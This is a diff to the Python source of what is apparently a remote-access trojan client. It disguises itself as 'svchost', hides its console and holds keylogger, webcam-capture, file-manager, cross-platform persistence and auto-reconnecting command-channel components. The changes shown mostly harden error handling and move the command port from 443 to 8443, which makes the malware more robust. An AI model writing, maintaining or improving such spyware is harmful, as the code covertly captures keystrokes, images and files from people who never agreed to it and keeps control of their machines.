@@ -23,27 +23,28 @@ if IS_WINDOWS:
     try:
         import winreg
         import ctypes
-    except:
-        pass
+    except Exception as e:
+        winreg = None
+        ctypes = None
 
 try:
     from PIL import ImageGrab
     PIL_AVAILABLE = True
-except:
+except Exception as e:
     PIL_AVAILABLE = False
 
 try:
     import pynput
     from pynput import keyboard
     PYNPUT_AVAILABLE = True
-except:
+except Exception as e:
     PYNPUT_AVAILABLE = False
 
 import crypto
 import protocol
 
 IP = "127.0.0.1"
-PORT = 443
+PORT = 8443
 PROGRAM_NAME = "svchost"
 MAX_BUFFER_SIZE = 500
 RECONNECT_DELAY = 5
@@ -52,18 +53,18 @@ MAX_RECONNECT_DELAY = 300
 class Disguise:
     @staticmethod
     def set_console_title(title=""):
-        if IS_WINDOWS:
+        if IS_WINDOWS and ctypes:
             try:
                 ctypes.windll.kernel32.SetConsoleTitleW(title)
-            except:
+            except Exception as e:
                 pass
     
     @staticmethod
     def hide_console():
-        if IS_WINDOWS:
+        if IS_WINDOWS and ctypes:
             try:
                 ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
-            except:
+            except Exception as e:
                 pass
 
 class Keylogger:
@@ -187,7 +188,7 @@ class Webcam:
                 _, img_encoded = cv2.imencode('.png', frame)
                 return img_encoded.tobytes()
             return None
-        except:
+        except Exception as e:
             return None
 
 class FileManager:
@@ -205,7 +206,7 @@ class FileManager:
             with open(filepath, 'wb') as f:
                 f.write(content)
             return True
-        except:
+        except Exception as e:
             return False
 
 class Persistence:
@@ -214,7 +215,7 @@ class Persistence:
         try:
             current = os.path.abspath(sys.argv[0])
             
-            if IS_WINDOWS:
+            if IS_WINDOWS and winreg:
                 try:
                     appdata = os.path.join(os.getenv('APPDATA', ''), 'Microsoft', 'Windows')
                     os.makedirs(appdata, exist_ok=True)
@@ -256,7 +257,7 @@ class Persistence:
                 except Exception as e:
                     print(f"[-] macOS persistence failed: {e}")
                     
-            else:  # Linux
+            else:
                 try:
                     target = os.path.expanduser("~/.local/share")
                     os.makedirs(target, exist_ok=True)
@@ -400,7 +401,7 @@ class Client:
                 self.listen(sock)
                 try:
                     sock.close()
-                except:
+                except Exception as e:
                     pass
             sleep(self.reconnect_delay)
             self.reconnect_delay = min(self.reconnect_delay * 2, MAX_RECONNECT_DELAY)
